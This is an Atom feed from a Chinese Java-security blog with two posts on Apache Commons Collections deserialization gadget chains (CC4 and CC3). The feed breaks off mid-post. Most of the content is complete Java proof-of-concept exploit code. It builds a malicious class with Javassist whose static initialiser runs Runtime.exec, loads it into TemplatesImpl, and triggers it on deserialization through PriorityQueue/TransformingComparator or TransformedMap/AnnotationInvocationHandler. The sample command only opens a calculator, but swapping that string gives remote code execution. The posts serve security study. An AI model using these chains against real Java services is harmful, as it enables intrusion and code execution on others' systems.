<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kpa1on&#39;s Blog</title>
  
  <subtitle>keep passion！</subtitle>
  <link href="https://kpa1on.github.io/atom.xml" rel="self"/>
  
  <link href="https://kpa1on.github.io/"/>
  <updated>2022-06-04T15:47:59.631Z</updated>
  <id>https://kpa1on.github.io/</id>
  
  <author>
    <name>kpa1on</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全之Commons Collections4分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections4%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T15:07:35.000Z</published>
    <updated>2022-06-04T15:47:59.631Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接</p><span id="more"></span><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>根据<code>TransformingComparator</code> 利用链完成调用。</p><p>直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析过程就不写了，和之前的链是一样的分析过程，只是触发调用 <code>transformerChain.transform()</code>方法采用的是另外一种方法，即<code>TransformingComparator.compare()</code>。</p><p>反序列化时弹出计算器</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604215447007-1005138662.png" alt="image-20220604215445704"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/hongduilanjun/article/details/123491483">https://blog.csdn.net/hongduilanjun/article/details/123491483</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14032604.html">https://www.cnblogs.com/nice0e3/p/14032604.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在构造CC4链时，看POC可以看出就是把CC2 和CC3的链进行了拼接&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections3分析</title>
    <link href="https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/</id>
    <published>2022-06-04T12:16:12.000Z</published>
    <updated>2022-06-04T15:45:14.983Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>cc3链可以说是cc1和cc2链的结合，下面进行分析。</p><span id="more"></span><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>Commons Collections</code> 中提供了一个 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 类，其实现了 <code>Transformer</code> 接口，并且该类有一个对外公开的构造方法，可以通过传入paramTypes和args对<code>this.iParamTypes</code> 和 <code>this.iArgs</code> 赋值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604203632873-572689021.png" alt="image-20220604203632075"></p><p>在上图还可以看到，存在<code>InstantiateTransformer#transform()</code>方法，该方法可以通过反射实例化一个对象并且返回。</p><p>此外，我们发现 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 类的构造方法中存在一处 <code>newTransformer()</code> 调用</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604204348803-761573955.png" alt="image-20220604204347822"></p><p>根据前面cc2链的利用思路，如果我们可以通过 <code>InstantiateTransformer.transform()</code> 方法实例化 <code>TrAXFilter</code> 类，在实例化的过程中，如果我们将 <code>TemplatesImpl</code> 类的对象传入 <code>TrAXFilter</code> 的构造方法，那我们就可以实现前面 cc2链中<code>TemplatesImpl.newTransformer()</code> 方法的调用了。</p><h3 id="InstantiateTransformer-利用链"><a href="#InstantiateTransformer-利用链" class="headerlink" title="InstantiateTransformer 利用链"></a>InstantiateTransformer 利用链</h3><p>对于 <code>InstantiateTransformer.transform()</code> 方法的调用思路，我们可以参考cc1链。</p><p>如下为poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCOriginal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是怎么自动触发调用 <code>transformerChain.transform()</code>方法的问题，根据我们前面cc1和cc2学习到的思路，一共有三种方法可以触发：</p><ul><li>TransformedMap 利用链：<code>TransformedMap.checkSetValue()</code></li><li>LazyMap 利用链：<code>LazyMap.get()</code></li><li>TransformingComparator 利用链：<code>TransformingComparator.compare()</code>（这种思路是cc4中的）</li></ul><h3 id="根据-TransformedMap-利用链完成调用"><a href="#根据-TransformedMap-利用链完成调用" class="headerlink" title="根据 TransformedMap 利用链完成调用"></a>根据 TransformedMap 利用链完成调用</h3><p>根据前面的学习，直接给出最终的反序列化 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObject);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="根据-LazyMap-利用链完成调用"><a href="#根据-LazyMap-利用链完成调用" class="headerlink" title="根据 LazyMap 利用链完成调用"></a>根据 LazyMap 